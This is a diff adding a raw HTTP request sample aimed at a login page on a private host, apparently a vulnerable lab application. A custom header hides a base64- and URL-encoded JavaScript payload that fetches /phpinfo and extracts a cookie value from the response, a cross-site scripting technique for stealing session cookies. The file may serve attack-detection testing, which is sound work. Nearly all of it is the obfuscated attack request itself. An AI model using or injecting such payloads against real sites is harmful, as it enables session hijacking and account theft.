@@ -1,0 +1,9 @@
+GET /login.php HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+WBH-437f0a: eCUzRG5ldyUyMFhNTEh0dHBSZXF1ZXN0JTI4JTI5JTNCJTIwaHR0cCUzQSUyRiUyRngub3BlbiUyOCUyN0dFVCUyNyUyQyUyNyUyRnBocGluZm8lMjclMkMwJTI5JTNCJTIweC5zZW5kJTI4JTI5JTNCcmVnZXglM0QlMkZDT09LSUUlMjcuJTJBdiUyMiUzRSUyOC4lMkElM0YlMjklM0MlMkZtJTNCJTIwYWxlcnQlMjh4LnJlc3BvbnNlVGV4dC5tYXRjaCUyOHJlZ2V4JTI5JTVCMSU1RCUyOSUzQg==
+Cookie: PHPSESSID=iqntvrl4r3cplifisbeo5im0m6; security=low
+
